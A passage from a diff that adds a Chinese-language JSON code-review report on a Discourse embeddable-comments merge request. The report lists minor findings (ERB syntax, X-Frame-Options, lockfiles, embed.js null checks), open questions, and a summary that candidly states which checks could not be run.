+      "rationale": "app/views/embed/best.html.erb:2-6 的 if / else 區塊只需要 end，第 6 行寫成 <%- end if %> 多了一個 if。\n\n我用 ruby 3.3.6 實際驗證過兩種產碼形狀。Rails 4 使用的 Erubis（Gemfile_rails4.lock:83，erubis 2.7.0）在這種「整行只有一個 statement」的情況會把行首縮排與行尾換行一起併進產碼，得到「end if \\n」後面接下一段 @output_buffer.safe_append=...；Ruby 於是把整個 if/else 區塊解析成一個修飾式 if，條件就是那個 append 運算式（永遠為真），所以剛好不會壞，但求值順序被改成「先輸出後面的空白、再跑 if/else」，而且 Ruby 會發出 found `= literal' in conditional 警告。相對地，標準函式庫的 ERB 會在 statement 後補 ;，產出 end if ; ——直接 SyntaxError（我實測 ERB.new(src, trim_mode: '-') 編譯這個檔案就是這個結果）。\n\n也就是說這行現在只是碰巧可用，任何換 template engine、升級 Rails（Rails 4.2 之後預設改用 Erubi）或有人動到相鄰空白的改動，都可能把它變成一個難查的模板錯誤。",
+      "fix": "改成 <%- end %>。順帶一提，本檔第 11 行與第 29 行寫的就是正確形式（<%- if ... %> ... <% end %>），可以直接對照。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-012",
+      "dimension": "C",
+      "severity": "Nit",
+      "status": "new",
+      "title": "X-Frame-Options 設成非標準值 ALLOWALL，而且這個 header 在本 repo 裡沒有預設值可以覆蓋",
+      "evidence": [
+        "app/controllers/embed_controller.rb:28",
+        "spec/controllers/embed_controller_spec.rb:37"
+      ],
+      "rationale": "X-Frame-Options 規範只定義 DENY、SAMEORIGIN 與（已廢棄的）ALLOW-FROM 三種值。ALLOWALL 是舊時代部分瀏覽器接受的非標準寫法，在嚴格解析的瀏覽器上，無法辨識的值可能被忽略（回到不阻擋，剛好符合預期）也可能被當成最保守處理（等同 DENY，iframe 直接空白）——行為不可預測，而這正是這個功能能不能運作的關鍵。\n\n另外我 grep 過整個 repo，除了這一行與 spec 之外沒有任何地方設定 X-Frame-Options，也就是說沒有需要被覆蓋的預設值；這行 header 目前是在對付 repo 外的東西（反向代理或 CDN 的預設設定），而那個前提沒有寫在任何地方。spec/controllers/embed_controller_spec.rb:37 又把這個字串當成成功斷言，等於把非標準值鎖進契約。",
+      "fix": "如果目標是「不要阻擋嵌入」，正確做法是不要送這個 header（response.headers.delete('X-Frame-Options')），並在註解寫明是為了覆蓋哪一層的預設。如果目標是「只允許 embeddable_host 嵌入」，改用 response.headers['Content-Security-Policy'] = \"frame-ancestors #{SiteSetting.embeddable_host}\"，這是真正能表達這個意圖的機制；spec 的斷言也一起改成驗這個。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-013",
+      "dimension": "B",
+      "severity": "Nit",
+      "status": "new",
+      "title": "TopicEmbed.import 就地修改傳入的 contents 參數",
+      "evidence": [
+        "app/models/topic_embed.rb:13"
+      ],
+      "rationale": "app/models/topic_embed.rb:13 用的是 String#<<，會直接改到呼叫端持有的那個字串物件，而不是產生新字串。目前兩個呼叫端（app/jobs/scheduled/poll_feed.rb:36 與 app/models/topic_embed.rb:50）剛好都是丟一個馬上就不再使用的區域變數，所以看不出症狀。但 import 這個名字與簽章完全沒有暗示它會改寫參數，下一個呼叫端如果在 import 之後還要用同一個字串（例如同時匯入到兩個地方、或先留一份原文備查），就會拿到被附加過 imported_from 註腳的版本——這正是 B-5 說的隱性副作用。",
+      "fix": "改成不修改參數：contents = \"#{contents}\\n<hr>\\n<small>#{I18n.t('embed.imported_from', link: \"<a href='#{url}'>#{url}</a>\")}</small>\\n\"。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-014",
+      "dimension": "B",
+      "severity": "Nit",
+      "status": "new",
+      "title": "Jobs::PollFeed#feed_key 定義後從未被呼叫",
+      "evidence": [
+        "app/jobs/scheduled/poll_feed.rb:20-22",
+        "app/jobs/scheduled/poll_feed.rb:4"
+      ],
+      "rationale": "我 grep 過整個 repo，feed_key 只出現在它自己的定義處，沒有任何呼叫端。它的命名（feed-modified:）看起來是要做 HTTP conditional GET / Last-Modified 快取，但那段邏輯並不在這個 MR 裡。連帶地第 4 行的 require 'digest/sha1' 在這個檔案裡也只被 feed_key 用到（TopicEmbed 用了 Digest::SHA1 但它自己沒有 require）。留著一個沒人呼叫的方法，下一個維護者會花時間判斷它是不是被動態呼叫。",
+      "fix": "如果 conditional GET 的實作會在後續 MR 補上，就先把 feed_key 與 require 'digest/sha1' 一起移除，等真的要用時再加回來；如果打算在本 MR 補完，就把它接上 open 的 If-Modified-Since header。兩者擇一，不要留在中間狀態。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-015",
+      "dimension": "A",
+      "severity": "Nit",
+      "status": "new",
+      "title": "require_dependency 用在 gem 上，以及一個完全沒用到的 require_dependency",
+      "evidence": [
+        "app/models/topic_embed.rb:1",
+        "app/jobs/regular/retrieve_topic.rb:1",
+        "lib/pretty_text.rb:2"
+      ],
+      "rationale": "app/models/topic_embed.rb:1 寫的是 require_dependency 'nokogiri'。require_dependency 是 Rails autoload 的重載機制，用途是讓 development 下改到的檔案能被重新載入；對一個 gem 使用它沒有意義，同一份 repo 的 lib/pretty_text.rb:2 用的就是 require 'nokogiri'。\n\napp/jobs/regular/retrieve_topic.rb:1 的 require_dependency 'email/sender' 則是整個檔案都沒有用到 Email::Sender，看起來是從別的 job 複製過來留下的。",
+      "fix": "app/models/topic_embed.rb:1 改成 require 'nokogiri'；刪掉 app/jobs/regular/retrieve_topic.rb:1 的 require_dependency 'email/sender'。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-016",
+      "dimension": "A",
+      "severity": "Nit",
+      "status": "new",
+      "title": "四個新檔案缺檔尾換行，外加一支無關 migration 的純空白變動",
+      "evidence": [
+        "app/assets/stylesheets/embed.css.scss:69",
+        "app/views/embed/loading.html.erb:12",
+        "app/views/layouts/embed.html.erb:20",
+        "lib/topic_retriever.rb:55",
+        "db/migrate/20131210181901_migrate_word_counts.rb:33"
+      ],
+      "rationale": "上述四個新檔案都以 \\ No newline at end of file 結尾。缺檔尾換行的實際代價是之後任何一次修改最後一行的 diff 都會多出一行雜訊，也讓 cat 串接多檔時黏在一起。\n\ndb/migrate/20131210181901_migrate_word_counts.rb 更值得一提：它在本次 diff 裡的全部變動就是「刪掉一行行尾空白」與「刪掉檔尾換行」，跟 embedding 功能毫無關係，而且方向是把一支原本正常的檔案改成沒有結尾換行。",
+      "fix": "四個新檔案補上結尾換行；把 db/migrate/20131210181901_migrate_word_counts.rb 從本 MR 的 diff 中移除（git checkout HEAD -- 該檔）。如果團隊在意行尾空白，那是 .editorconfig 或獨立的格式化 commit 的事，不該混進功能 MR。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-017",
+      "dimension": "H",
+      "severity": "Nit",
+      "status": "new",
+      "title": "三支 lockfile 只更新了一支，RAILS3 與 RAILS_MASTER 兩條路徑會裝不到新 gem",
+      "evidence": [
+        "Gemfile:209-211",
+        "Gemfile_rails4.lock:313",
+        "Gemfile.lock",
+        "Gemfile_rails_master.lock"
+      ],
+      "rationale": "Gemfile:22-41 的雙啟動機制用 RAILS3 / RAILS_MASTER 環境變數決定要讀哪一支 lockfile：預設（rails4）讀 Gemfile_rails4.lock、RAILS3=1 讀 Gemfile.lock、RAILS_MASTER=1 讀 Gemfile_rails_master.lock。本 MR 在 Gemfile:209-211 新增了 ruby-readability 與 simple-rss，但只有 Gemfile_rails4.lock 被更新——我 grep 過另外兩支，兩個 gem 名稱一次都沒有出現。\n\n預設路徑（也就是 .travis.yml 跑的那條）沒問題，所以列為 Nit；但在 RAILS3=1 或 RAILS_MASTER=1 下，Gemfile 與 lockfile 不一致，bundle install --deployment / frozen 會直接失敗，非 frozen 的情況也會在每次執行時重新解析相依。",
+      "fix": "跑一次 RAILS3=1 bundle install 與 RAILS_MASTER=1 bundle install，把三支 lockfile 一起提交。如果 RAILS3 這條路徑其實已經不再維護，那更適合的做法是另開一個 MR 把 Gemfile.lock 與相關分支邏輯一起移除，而不是讓它保持在半更新狀態。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-018",
+      "dimension": "H",
+      "severity": "Nit",
+      "status": "new",
+      "title": "embed.js 對宿主頁面有兩個沒有防護也沒有文件的假設",
+      "evidence": [
+        "app/assets/javascripts/embed.js:5",
+        "app/assets/javascripts/embed.js:7",
+        "app/assets/javascripts/embed.js:12"
+      ],
+      "rationale": "這支檔案是要交給第三方站長貼進自己頁面的，所以它對宿主頁面的每一個假設都是一份隱性的整合契約：\n\n1. app/assets/javascripts/embed.js:5 取 document.getElementById('discourse-comments') 之後沒有 null 檢查，第 12 行直接 comments.appendChild(iframe)。宿主頁面漏了那個容器、或 script 被放在容器之前執行，就會丟 TypeError 中斷整支 script，站長只會看到「留言區沒出現」而沒有任何線索。\n2. 第 7 行的 discourseUrl + \"embed/best?...\" 要求 discourseUrl 必須以 / 結尾，否則會拼出 http://forum.example.comembed/best。\n\n這兩件事在本 MR 裡都沒有文件說明（diff 內沒有任何安裝說明或範例 snippet）。",
+      "fix": "第 5 行之後補 if (!comments) { return; }（或用 console.warn 給站長一個訊號）；第 7 行改成 discourseUrl.replace(/\\/+$/, '') + 'embed/best?...'。另外建議在本 MR 附上一段給站長複製的安裝 snippet（含 discourseUrl / discourseEmbedUrl 的設定範例與 #discourse-comments 容器），這是這個功能能不能被使用的前提。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    }
+  ],
+  "open_questions": [
+    {
+      "id": "Q-001",
+      "dimension": "F",
+      "question": "topic_embeds.embed_url 用 t.string（PostgreSQL 的 varchar(255)）夠不夠裝實際要匯入的 URL？",
+      "context": "db/migrate/20131217174004_create_topic_embeds.rb:6 把 embed_url 宣告為 t.string, null: false，Rails 4 在 PostgreSQL 下對應 character varying(255)。我確認過 app/models/topic_embed.rb:10-42 的 import 沒有任何長度截斷，absolutize_urls 也不會縮短 URL；超過 255 字元時 TopicEmbed.create!（app/models/topic_embed.rb:25）會拋 ActiveRecord::StatementInvalid，而它在 Topic.transaction 裡，會把剛建好的 topic 與 post 一起 rollback（與 F-010 是同一個爆點）。帶完整 UTM 參數的部落格 permalink 超過 255 字元並不罕見，但這完全取決於這個站台實際要匯入哪些來源，我沒有辦法從 repo 裡判斷。",
+      "what_would_settle_it": "對預定的 feed 與 disqus export 量一次 URL 長度分佈；或直接把欄位改成 t.text，並把 unique index 改成建在 md5(embed_url) 上（PostgreSQL 的 btree 對超長值有大小限制，直接對 text 建 unique index 在長 URL 上會失敗）。"
+    },
+    {
+      "id": "Q-002",
+      "dimension": "E",
+      "question": "TopicRetriever 在 feed polling 開啟時同步跑一整輪 PollFeed，是刻意的設計還是沒有預期到的放大？",
+      "context": "lib/topic_retriever.rb:40-43：只要 SiteSetting.feed_polling_enabled? 為真，每一個「站上還沒有對應 topic」的 embed 請求都會同步執行 Jobs::PollFeed.new.execute({})，也就是完整抓一次 feed 並對裡面每一則 item 做 TopicEmbed.import（app/jobs/scheduled/poll_feed.rb:31-37）。lib/topic_retriever.rb:26-30 的 60 秒節流是以 embed_url 為 key，所以 N 個不同的新 URL 同時進來就會觸發 N 輪完整 polling。從註解「First check RSS if that is enabled」看得出來意圖是「新文章要能立刻出現，不用等下一個整點」，這個意圖合理；但用整輪 polling 來達成它，成本會隨 feed 大小與並發量放大，而且是 F-010 那個競態的直接來源。我無法從 repo 判斷預期的 feed 規模與 embed 流量。",
+      "what_would_settle_it": "作者說明預期的 feed item 數與 embed 頁面的並發量；或改成加一個以 feed 為 key（而非以 embed_url 為 key）的節流／鎖，讓同一時間最多只有一輪 polling 在跑，再量一次每輪的耗時。"
+    },
+    {
+      "id": "Q-003",
+      "dimension": "D",
+      "question": "在開啟 login_required 的私密論壇上，embed/best 被導向登入頁是刻意的嗎？",
+      "context": "app/controllers/embed_controller.rb:2-3 只 skip 了 check_xhr 與 preload_json；ApplicationController 上的 before_filter :redirect_to_login_if_required（app/controllers/application_controller.rb:37）仍然生效。在 login_required 的站台上，第三方頁面裡的 iframe 會顯示登入頁而不是留言。這有可能是刻意的（私密論壇本來就不該把內容嵌到外站），也有可能是沒想到——diff 內沒有任何註解或測試表態，spec/controllers/embed_controller_spec.rb 也沒有覆蓋這個情境。",
+      "what_would_settle_it": "作者確認 embedding 是否要支援 login_required 的站台。若不支援，在 ensure_embeddable 裡明確 raise 一個「此站台不開放嵌入」的訊息會比默默導向登入頁清楚得多，並補一個對應的 spec；若要支援，則需要另外設計匿名可讀的授權路徑。"
+    }
+  ],
+  "rereview": null,
+  "conclusion": "Request Changes",
+  "summary": "本次是 round 1、local_branch 模式，對 discourse-graphite-4（FEATURE: Embeddable Discourse comments，以 simple-rss 取代 feedzirra）的完整 diff 做審查。\n\n**執行環境的限制必須先講清楚**：這台機器沒有網路、沒有安裝任何 Ruby gem，因此整份審查沒有跑過任何 spec、migration 或應用程式；trivy / opengrep / ty / oxlint / codegraph 全部未安裝，ruff 雖然有裝但這個 repo 一個 Python 檔案都沒有。也就是說本報告沒有任何一項工具覆蓋——所有 finding 都來自人工閱讀完整 checkout（我把 refs/ncr/pr checkout 出來取得完整原始碼），唯一實際執行過的驗證是用 ruby 3.3.6 檢查 ERB 產碼的語法（F-011）。此外這個環境不支援派送 subagent，Phase 3 的 ncr-fresh-eyes 與 Phase 4 的 ncr-quality-check 都未執行，細節見「掃描執行狀況」。\n\n**三個 Critical**：embed.css 與 embed.js 沒有進 assets.precompile，production 下這個功能唯一的頁面會取不到樣式（F-001）；RSS 匯入的 HTML 透過新的 raw_html cook method 完整繞過 sanitize 而輸出端用 raw 直出，形成 stored XSS，且同一支 model 的 import_remote 路徑其實有白名單，兩條路徑防護不對稱（F-002）；GET embed/best 會建立 topic 與 post，違反 GET 的安全性語意（F-003）。\n\n**功能設計本身是紮實的**：controller 薄、TopicRetriever 負責節流與路由、TopicEmbed 負責匯入，職責切得乾淨；loading 與 empty 兩個渲染狀態都有畫面；cook_method 的 migration 預設值與 Enum 起始值對得上，既有 post 的行為不受影響；PostRevisor 與 PostCreator 的既有呼叫端都確認過相容。主要的問題集中在「離開 happy path 之後」——遠端資料的 nil、並行匯入的競態、production 才會出現的資產問題，以及三處與本功能無關、應該拆出去的變動（disqus.thor、top_topics migration 加 force: true、一支 migration 的純空白改動，見意圖確認）。\n\n另有三個無法在此環境確認的提問列在未驗證提問，沒有給嚴重度。"
+}
